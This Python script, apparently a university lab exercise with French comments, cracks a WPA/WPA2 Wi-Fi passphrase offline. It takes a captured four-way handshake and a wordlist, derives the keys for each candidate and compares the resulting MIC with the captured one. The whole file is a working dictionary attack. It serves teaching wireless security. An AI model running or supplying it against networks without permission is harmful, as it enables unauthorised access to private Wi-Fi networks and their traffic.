#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2_math import pbkdf2_hex
from numpy import array_split
from numpy import array
import hmac, hashlib
import string as st

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = ''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap")

# Read dictionnary of the file wordlist.txt
fname = "wordlist.txt"

# Création d'un tableau de mot à partie de la liste de mot
with open(fname) as f:
    wordArray = []
    for line in f:
        wordArray.append(line)

#print(wordArray)

# Suppression des \n
for i in range(0, len(wordArray)):
    wordArray[i] = wordArray[i].rstrip("\n")

#print(wordArray)
# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = wpa[0].info
APmac       = wpa[0].addr2
APmac       = a2b_hex(APmac.replace(":",""))
Clientmac   = wpa[1].addr1
Clientmac   = a2b_hex(Clientmac.replace(":",""))

# Authenticator and Supplicant Nonces
ANonce      = a2b_hex(wpa[5].load.encode('hex')[26:90])
SNonce      = a2b_hex(wpa[6].load.encode('hex')[26:90])

for passPhrase in wordArray:

    # This is the MIC contained in the 4th frame of the 4-way handshake
    # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
    #mic_to_test = "36eef66540fa801ceee2fea9b7929b40"

    #Récupération du mic à tester "36eef66540fa801ceee2fea9b7929b40"
    mic_to_test = wpa[8].load.encode('hex')[-36:][:-4]

    B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

    # Ajout des donnée de l'EAPOL à la chain data extraite de la trame 9
    data = "0103005f" + wpa[8].load.encode('hex')

    # Suppression des 36 dernier caractère hexadecimal de la chaine afin de supprimer le mic
    data = data[:-36]

    # Remplacement des 36 caractère hexadecimaux avec des 0
    for i in range(0,36):
        data = data + '0'
 
    data = a2b_hex(data)

    print "data: ", data, "\n"

    print "\n\nValues used to derivate keys"
    print "============================"
    print "Passphrase: ", passPhrase, "\n"
    print "SSID: ", ssid, "\n"
    print "AP Mac: ", b2a_hex(APmac), "\n"
    print "Client Mac: ", b2a_hex(Clientmac), "\n"
    print "AP Nonce: ", b2a_hex(ANonce), "\n"
    print "Client Nonce: ", b2a_hex(SNonce), "\n"

    print("\n\n***************************** Test lecture passphrase *****************************")

    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    pmk = pbkdf2_hex(passPhrase, ssid, 4096, 32)

    #expand pmk to obtain PTK
    ptk = customPRF512(a2b_hex(pmk),A,B)

    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16],data,hashlib.sha1)

    # Extraction du nouveau mic
    mic_to_compare = mic.hexdigest()[0:len(mic_to_test)]
    print("new mic: ", mic_to_compare)
    print("mic to test: ", mic_to_test)

    # Comparaison du nouveau mic avec le mic à tester
    if mic_to_compare == mic_to_test:
        print("YES WE DID IT")
        print(passPhrase)
        break;


print("\nResults of the key expansion")
print("=============================")
print("PMK: ", pmk)
print("PTK: ", b2a_hex(ptk))
print("KCK: ", b2a_hex(ptk[0:16]))
print("KEK: ", b2a_hex(ptk[16:32]))
print("TK: ", b2a_hex(ptk[32:48]))
print("MICK: ", b2a_hex(ptk[48:64]))
print("MIC: ", mic.hexdigest())